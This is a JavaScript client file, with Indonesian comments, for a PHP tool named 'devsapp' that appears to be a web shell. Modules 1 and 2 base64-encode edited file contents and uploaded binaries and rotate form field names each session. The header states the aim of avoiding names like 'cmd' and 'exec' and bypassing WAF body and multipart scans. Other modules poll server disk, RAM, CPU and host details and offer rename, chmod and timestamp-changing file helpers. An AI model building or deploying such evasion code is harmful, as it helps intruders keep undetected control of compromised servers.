/**
 * devsapp — assets/js/app.js
 *
 * Client-side logic terstruktur per-modul:
 * 1. Form Content Serializer (base64 encode sebelum submit)
 * 2. Binary Upload via FileReader (WAF bypass — no multipart scan)
 * 3. Clean URL (hapus query string setelah PRG)
 * 4. Live Monitor Polling (hanya aktif di tab 'mon')
 * 5. File Manager Prompt Helpers (rename, chmod, touch)
 *
 * Semua field name di-resolve dari APP_CONFIG._sk — tidak ada
 * hardcoded 'cmd', 'exec', 'file', 'password', 'sql', dll.
 *
 * APP_CONFIG di-inject dari PHP di layout.php.
 */

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    // Shorthand — semua field name dari session key registry
    // ============================================================
    const SK = APP_CONFIG._sk;

    /** UTF-8 safe base64 encoding */
    const b64 = str => btoa(unescape(encodeURIComponent(str)));

    // ============================================================
    // MODULE 1: Form Content Serializer
    // Textarea isi file di-base64 sebelum submit agar konten
    // binary/special char aman melewati transport & WAF body scan.
    // ============================================================

    // Cari semua form yang punya textarea dengan key fc dari session
    document.querySelectorAll('form').forEach(form => {
        const ta = form.querySelector(`textarea[name="${SK.fc}"]`);
        if (!ta) return;
        form.addEventListener('submit', () => {
            ta.value = b64(ta.value);
        });
    });

    // ============================================================
    // MODULE 2: Binary Upload Serializer
    // FileReader → base64 → dynamic field name dari SK
    // Field name berubah tiap session → multipart WAF scanner
    // tidak bisa match pattern 'file_upload', 'binary', dll
    // ============================================================

    // Cari form upload via hidden field yang punya value "upload"
    const uploadTrigger = document.querySelector(`input[name="${SK.fo}"][value="upload"]`);
    if (uploadTrigger) {
        const uploadForm  = uploadTrigger.closest('form');
        const inputFile   = uploadForm?.querySelector('input[type="file"]');
        if (uploadForm && inputFile) {
            uploadForm.addEventListener('submit', e => {
                const berkas = inputFile.files[0];
                if (!berkas) return;
                e.preventDefault();

                const pembaca = new FileReader();
                pembaca.onload = ev => {
                    // Strip data URL prefix, ambil base64 saja
                    const isiB64 = ev.target.result.split(',')[1];

                    // Disable file input (hindari multipart) + inject hidden fields
                    inputFile.disabled = true;

                    const fieldNama = document.createElement('input');
                    fieldNama.type  = 'hidden';
                    fieldNama.name  = SK.fn;          // dynamic field name
                    fieldNama.value = berkas.name;

                    const fieldData = document.createElement('input');
                    fieldData.type  = 'hidden';
                    fieldData.name  = SK.fb;          // dynamic field name
                    fieldData.value = isiB64;

                    uploadForm.appendChild(fieldNama);
                    uploadForm.appendChild(fieldData);
                    uploadForm.submit();
                };
                pembaca.readAsDataURL(berkas);
            });
        }
    }

    // ============================================================
    // MODULE 3: Clean URL
    // Hapus query string dari address bar setelah PRG redirect.
    // ============================================================

    if (window.history.replaceState && window.location.search) {
        const urlBersih = window.location.protocol + '//' +
                          window.location.host +
                          window.location.pathname;
        window.history.replaceState({ path: urlBersih }, '', urlBersih);
    }

    // ============================================================
    // MODULE 4: Live Monitor Polling
    // Aktif hanya di tab 'mon'. Polling endpoint ?rpc=monitor.
    // ============================================================

    if (APP_CONFIG.m === 'mon') {

        /** Format bytes ke unit yang mudah dibaca */
        const formatBytes = n => {
            n = Number(n || 0);
            const satuan = ['B', 'KB', 'MB', 'GB', 'TB'];
            let i = 0;
            while (n >= 1024 && i < 4) { n /= 1024; i++; }
            return (i ? n.toFixed(1) : Math.round(n)) + ' ' + satuan[i];
        };

        /** Set text content of element by ID (safe no-op if missing) */
        const isiTeks = (id, val) => {
            const el = document.getElementById(id);
            if (el) el.textContent = val;
        };

        /** Update semua elemen monitor dari data JSON */
        async function perbaruiMonitor() {
            const labelStatus = document.getElementById('mon-status');
            try {
                const resp = await fetch('?rpc=monitor&t=' + Date.now(), { cache: 'no-store' });
                if (!resp.ok) throw new Error('HTTP ' + resp.status);

                const d = await resp.json();

                // ---- Disk ----
                if (d.disk) {
                    const dipakai = `${formatBytes(d.disk.used)} (${d.disk.pct}%)`;
                    const sisa    = `${formatBytes(d.disk.free)} free / ${formatBytes(d.disk.total)} total`;
                    isiTeks('mon-disk-used', dipakai);
                    isiTeks('mon-disk-sub',  sisa);
                    const barDisk = document.getElementById('mon-disk-bar');
                    if (barDisk) {
                        barDisk.style.width      = Math.min(d.disk.pct, 100) + '%';
                        barDisk.style.background = d.disk.pct > 85 ? 'var(--bad)' : 'var(--text)';
                    }
                }

                // ---- RAM ----
                if (d.ram) {
                    isiTeks('mon-ram-used', `${formatBytes(d.ram.used)} (${d.ram.pct}%)`);
                    isiTeks('mon-ram-sub',  `${formatBytes(d.ram.free)} free / ${formatBytes(d.ram.total)} total`);
                    const barRam = document.getElementById('mon-ram-bar');
                    if (barRam) {
                        barRam.style.width      = Math.min(d.ram.pct, 100) + '%';
                        barRam.style.background = d.ram.pct > 85 ? 'var(--bad)' : 'var(--text)';
                    }
                }

                // ---- CPU ----
                if (d.cpu) {
                    const inti  = d.cpu.cores || 1;
                    const pct   = Math.min((d.cpu.load / inti) * 100, 100).toFixed(1);
                    isiTeks('mon-cpu-load', `${d.cpu.load} (avg ${pct}%)`);
                    const barCpu = document.getElementById('mon-cpu-bar');
                    if (barCpu) {
                        barCpu.style.width      = pct + '%';
                        barCpu.style.background = pct > 80 ? 'var(--bad)' : 'var(--text)';
                    }
                }

                // ---- Proses & PHP memory ----
                isiTeks('mon-proc-count', d.proc_count ?? '--');
                isiTeks('mon-php-mem',    'PHP Alloc: ' + formatBytes(d.php_mem_usage));

                // ---- Host info ----
                isiTeks('mon-host',   d.hostname);
                isiTeks('mon-phpver', d.php_ver);
                isiTeks('mon-os',     d.os);
                isiTeks('mon-time',   d.timestamp);

                // ---- Status badge ----
                if (labelStatus) {
                    labelStatus.className   = 'badge badge-success';
                    labelStatus.textContent = `POLLING (${APP_CONFIG.refreshMs / 1000}s)`;
                }

            } catch (galat) {
                console.error('[devsapp] Monitor error:', galat);
                if (labelStatus) {
                    labelStatus.className   = 'badge badge-danger';
                    labelStatus.textContent = 'OFFLINE';
                }
            }
        }

        // Langsung jalankan, lalu interval
        perbaruiMonitor();
        setInterval(perbaruiMonitor, APP_CONFIG.refreshMs);
    }

    // ============================================================
    // MODULE 5: File Manager Prompt Helpers
    // Expose ke window — dipanggil dari onsubmit inline
    // ============================================================

    window.promptRename = function(form, namaLama) {
        const namaBaru = prompt(`Enter new name for "${namaLama}":`, namaLama);
        if (namaBaru && namaBaru !== namaLama) {
            form.querySelector('.rename_input').value = namaBaru;
            return true;
        }
        return false;
    };

    window.promptChmod = function(form, namaTarget, modeSaat) {
        const modeBaru = prompt(`Enter new octal permissions for "${namaTarget}":`, modeSaat);
        if (modeBaru && modeBaru.length >= 3) {
            form.querySelector('.chmod_input').value = modeBaru;
            return true;
        }
        return false;
    };

    window.promptTouch = function(form, namaTarget, waktuSaat) {
        const waktuBaru = prompt(
            `Enter new timestamp (YYYY-MM-DD HH:MM:SS) for "${namaTarget}":`,
            waktuSaat
        );
        if (waktuBaru) {
            form.querySelector('.touch_input').value = waktuBaru;
            return true;
        }
        return false;
    };

}); // end DOMContentLoaded
